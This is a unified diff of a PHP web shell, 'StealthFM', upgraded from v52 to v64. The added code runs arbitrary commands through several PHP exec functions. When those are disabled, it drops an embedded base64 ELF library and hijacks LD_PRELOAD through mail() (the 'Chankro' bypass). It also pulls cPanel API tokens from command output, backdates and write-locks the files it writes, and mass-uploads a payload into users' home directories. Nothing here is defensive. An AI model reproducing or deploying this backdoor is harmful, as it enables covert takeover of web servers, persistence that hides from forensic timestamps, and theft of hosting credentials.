@@ -1,7 +1,7 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V52 (FINAL: GUI SCAN + LOGIC FIX)
-// MODIFIED: CLICKING GOOGLE ICON NOW TURNS THE *BROWSER ICON* GREEN
+// STEALTH FM V64 (FINAL: ANTI-LOOP WGET + AUTO REFRESH)
+// MODIFIED: USE 'env -u' TO KILL LD_PRELOAD RECURSION PERMANENTLY
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE
@@ -61,11 +61,39 @@ function x_read($path) {
     if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
     return false;
 }
-function x_write($path, $data) {
-    if (@file_put_contents($path, $data)) return true;
-    if (function_exists('fopen')) { $h = @fopen($path, "w"); if ($h) { fwrite($h, $data); fclose($h); return true; } }
-    return false;
+
+// --- FITUR: ROBUST WRITE (FORCE EDIT 0444 & ANTI 0KB) ---
+function x_robust_write($path, $data, $lock_mode = false) {
+    if (file_exists($path)) { @chmod($path, 0644); }
+
+    $fp = @fopen($path, 'c+'); 
+    if ($fp) {
+        if (@flock($fp, LOCK_EX)) { 
+            @ftruncate($fp, 0);     
+            @fwrite($fp, $data);    
+            @fflush($fp);           
+            @flock($fp, LOCK_UN);   
+        } else {
+            @file_put_contents($path, $data);
+        }
+        @fclose($fp);
+    } else {
+        if(file_exists($path)) @unlink($path);
+        @file_put_contents($path, $data);
+    }
+
+    clearstatcache();
+    if (filesize($path) == 0 && strlen($data) > 0) {
+        @unlink($path);
+        @file_put_contents($path, $data);
+    }
+
+    @touch($path, time() - 34560000); 
+    if ($lock_mode) { @chmod($path, 0444); }
+
+    return file_exists($path);
 }
+
 function x_link($target, $link) {
     if (function_exists('symlink')) @symlink($target, $link);
     elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
@@ -179,7 +207,7 @@ if (isset($_SERVER[$h_act])) {
         if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
             $input = base64_decode($input);
         }
-        echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; 
+        echo (x_robust_write($target, $input, true) !== false) ? "Success" : "Err: Write failed"; 
         exit; 
     }
 
@@ -187,31 +215,116 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
     if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
+    // --- BYPASS CMD (V64: ENV -U FIXED + AUTO REFRESH) ---
     if ($action === 'cmd') {
-        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
+        $cmd_raw = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
+        
+        // Deteksi UAPI untuk strategi output
+        $is_uapi_token = (stripos($cmd_raw, 'uapi') !== false && stripos($cmd_raw, 'Tokens') !== false);
+
+        // Fix Path
+        $cmd = "export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin; " . $cmd_raw;
         $cmd_exec = $cmd . " 2>&1";
         $out = ""; 
-        if (function_exists('proc_open')) {
-            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
-            $process = proc_open($cmd, $descriptors, $pipes, $target); 
-            if (is_resource($process)) {
-                fclose($pipes[0]); 
-                $out .= stream_get_contents($pipes[1]); 
-                $out .= stream_get_contents($pipes[2]); 
-                fclose($pipes[1]); fclose($pipes[2]);
-                proc_close($process);
+
+        // Helper Run
+        $try_run = function($method, $c) {
+            if (!function_exists($method)) return false;
+            $o = "";
+            if ($method == 'shell_exec') $o = @shell_exec($c);
+            elseif ($method == 'passthru') { ob_start(); @passthru($c); $o = ob_get_clean(); }
+            elseif ($method == 'system') { ob_start(); @system($c); $o = ob_get_clean(); }
+            elseif ($method == 'exec') { @exec($c, $arr); $o = implode("\n", $arr); }
+            elseif ($method == 'popen') { $h = @popen($c, 'r'); if($h) { while(!feof($h)) $o .= fread($h, 1024); pclose($h); } }
+            elseif ($method == 'proc_open') {
+                $d = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
+                $p = @proc_open($c, $d, $pipes);
+                if (is_resource($p)) {
+                    $o = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]); 
+                    fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
+                }
+            }
+            return $o;
+        };
+
+        // 1. STANDARD ATTEMPT
+        if (!$is_uapi_token) {
+            $methods = ['shell_exec', 'passthru', 'proc_open', 'system'];
+            foreach ($methods as $m) {
+                if ($d = ini_get('disable_functions')) { if (stripos($d, $m) !== false) continue; }
+                $res = $try_run($m, $cmd_exec);
+                if (stripos($res, 'Cannot allocate') !== false || stripos($res, 'fork') !== false) continue;
+                if (!empty($res)) { $out = $res; break; }
             }
         }
-        if (empty($out)) {
-            if(function_exists('shell_exec')) { $out = @shell_exec($cmd_exec); }
-            elseif(function_exists('passthru')) { ob_start(); @passthru($cmd_exec); $out = ob_get_clean(); }
-            elseif(function_exists('exec')) { $a=[]; @exec($cmd_exec,$a); $out = implode("\n",$a); }
-            elseif(function_exists('popen')) { $h=@popen($cmd_exec,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
-            elseif(function_exists('system')) { ob_start(); @system($cmd_exec); $out = ob_get_clean(); }
+
+        // 2. CHANKRO FALLBACK (ANTI-LOOP VIA 'env -u')
+        if (empty($out) || $is_uapi_token) {
+            
+            $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAR0NDOiAoRGViaWhuIDYuMy4wLTE4K2RlYjllMSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1deQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1TM_lFTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';
+
+            $so_file = $target . '/chankro.so';
+            $socket_file = $target . '/acpid.socket';
+            
+            // Output ke TMP jika UAPI (lebih cepat/stabil), lokal jika biasa
+            if ($is_uapi_token) {
+                $out_file = '/tmp/sfm_out_' . time() . '.txt';
+            } else {
+                $out_file = $target . '/chankro_out.txt';
+            }
+            
+            @unlink($so_file); @unlink($socket_file); @unlink($out_file);
+
+            // ANTI-LOOP: Gunakan 'env -u' untuk membersihkan variabel hook sebelum perintah dijalankan
+            // Ini jauh lebih kuat daripada 'unset' karena memanipulasi environment proses secara paksa
+            $safe_cmd = "export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin; env -u LD_PRELOAD -u CHANKRO " . $cmd_raw;
+            $full_command = "($safe_cmd) > $out_file 2>&1";
+            
+            $meterpreter = base64_encode($full_command);
+            
+            x_robust_write($so_file, base64_decode($hook));
+            x_robust_write($socket_file, base64_decode($meterpreter));
+            
+            putenv('CHANKRO=' . $socket_file);
+            putenv('LD_PRELOAD=' . $so_file);
+
+            if (function_exists('mail')) { @mail('a','a','a','a'); } 
+            elseif (function_exists('mb_send_mail')) { @mb_send_mail('a','a','a','a'); } 
+            elseif (function_exists('error_log')) { @error_log('a', 1, 'a'); } 
+            elseif (function_exists('imap_mail')) { @imap_mail('a','a','a'); }
+
+            sleep($is_uapi_token ? 5 : 2);
+
+            if (file_exists($out_file)) {
+                $raw_out = file_get_contents($out_file);
+                
+                if ($is_uapi_token) {
+                    if (preg_match('/token:\s*(\S+)/i', $raw_out, $m)) {
+                        $out = "SUCCESS TOKEN:\n" . $m[1];
+                    } elseif (stripos($raw_out, 'You do not have the feature') !== false) {
+                        $out = "FAILED: Feature 'apitokens' disabled by host.";
+                    } else {
+                        $clean = preg_replace('/^ERROR: ld\.so:.*$/m', '', $raw_out);
+                        $out = trim($clean);
+                        if(empty($out)) $out = "UAPI Executed but no token found (Raw):\n" . substr($raw_out, 0, 500);
+                    }
+                } else {
+                    // CLEAN OUTPUT
+                    $clean = preg_replace('/^ERROR: ld\.so:.*$/m', '', $raw_out);
+                    $out = trim($clean);
+                }
+                
+                if (empty($out) && !empty($raw_out)) $out = $raw_out;
+            } else {
+                $out = "[Chankro Failed: Output file not created at $out_file]";
+            }
+
+            @unlink($so_file); @unlink($socket_file); 
+            if($is_uapi_token) @unlink($out_file);
         }
+
         if (empty($out) || strlen(trim($out)) === 0) {
-            $disabled = ini_get('disable_functions');
-            $out = "[No Output]\n\n--- DEBUG INFO ---\nUser: " . get_current_user() . "\nDisabled Functions: " . ($disabled ? $disabled : "NONE") . "\nShell_exec: " . (function_exists('shell_exec') ? "YES" : "NO") . "\nProc_open: " . (function_exists('proc_open') ? "YES" : "NO");
+            $out = "[No Output Produced]";
         }
         echo $out; exit;
     }
@@ -220,6 +333,7 @@ if (isset($_SERVER[$h_act])) {
         $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
         $home_dirs = get_home_dirs();
 
+        // --- UPDATED MASS UPLOAD (USE ROBUST WRITE) ---
         if ($tool === 'mass_upload') {
             $mode = isset($_SERVER[$h_mmode]) ? $_SERVER[$h_mmode] : 'init';
             $tmp_list = sys_get_temp_dir() . "/sfm_mass_targets.json";
@@ -254,7 +368,7 @@ if (isset($_SERVER[$h_act])) {
                 $count_ok = 0;
 
                 foreach($batch as $dir) {
-                    if(@file_put_contents($dir . '/' . $filename, $payload)) $count_ok++;
+                    if(x_robust_write($dir . '/' . $filename, $payload, false)) $count_ok++;
                 }
 
                 $next_step = $step + $limit;
@@ -679,7 +793,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v52</title>
+    <title>StealthFM v64</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -828,7 +942,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v52</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v64</div></div>
         <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -1031,7 +1145,9 @@ if (isset($_SERVER[$h_act])) {
         let content = editor.getValue(); 
         let encoded = btoa(unescape(encodeURIComponent(content))); 
         api('save', currentFile, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
-            showToast(m); editModal.hide(); 
+            showToast(m); 
+            editModal.hide(); 
+            loadDir(''); // AUTO REFRESH
         }); 
     }
     
@@ -1050,7 +1166,7 @@ if (isset($_SERVER[$h_act])) {
             api('save', path, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
                 showToast("Created: " + name); 
                 newFileModal.hide();
-                loadDir(''); 
+                loadDir(''); // AUTO REFRESH
             });
         }
     }
@@ -1068,7 +1184,12 @@ if (isset($_SERVER[$h_act])) {
             let content = e.target.result.split(',')[1];
             api('upload', path, 'PUT', {'X-Encode': 'b64'}, content)
                 .then(r => r.text())
-                .then(m => { showToast(m); input.value=''; btn.innerHTML=old; loadDir(''); })
+                .then(m => { 
+                    showToast(m); 
+                    input.value=''; 
+                    btn.innerHTML=old; 
+                    loadDir(''); // AUTO REFRESH
+                })
                 .catch(() => { showToast("Upload Failed", "error"); btn.innerHTML=old; });
         };
         reader.readAsDataURL(file);
@@ -1077,7 +1198,10 @@ if (isset($_SERVER[$h_act])) {
     function deleteItem(name) { 
         if(confirm(`Del ${name}?`)) { 
             let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
-            api('delete', path, 'DELETE').then(() => { showToast("Deleted: " + name); loadDir(''); }); 
+            api('delete', path, 'DELETE').then(() => { 
+                showToast("Deleted: " + name); 
+                loadDir(''); // AUTO REFRESH
+            }); 
         } 
     }
     
@@ -1094,7 +1218,7 @@ if (isset($_SERVER[$h_act])) {
             api('rename', path, 'GET', {'X-Data': btoa(newName)}).then(r => { 
                 showToast(r.text()); 
                 renameModal.hide();
-                loadDir(''); 
+                loadDir(''); // AUTO REFRESH
             });
         }
     }
@@ -1103,7 +1227,10 @@ if (isset($_SERVER[$h_act])) {
         let n=prompt("Chmod:", "0"+p); 
         if(n) { 
             let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
-            api('chmod', path, 'GET', {'X-Data': n}).then(() => { showToast("Chmod Updated"); loadDir(''); }); 
+            api('chmod', path, 'GET', {'X-Data': n}).then(() => { 
+                showToast("Chmod Updated"); 
+                loadDir(''); // AUTO REFRESH
+            }); 
         } 
     }
     
@@ -1115,7 +1242,14 @@ if (isset($_SERVER[$h_act])) {
             let outDiv = document.getElementById('term-output');
             outDiv.innerHTML += `<div><span style="color:#c586c0;">&#10140;</span> <span style="color:#d4d4d4;">${cmd}</span></div>`;
             this.value = ''; outDiv.scrollTop = outDiv.scrollHeight;
-            api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; outDiv.scrollTop = outDiv.scrollHeight; });
+            
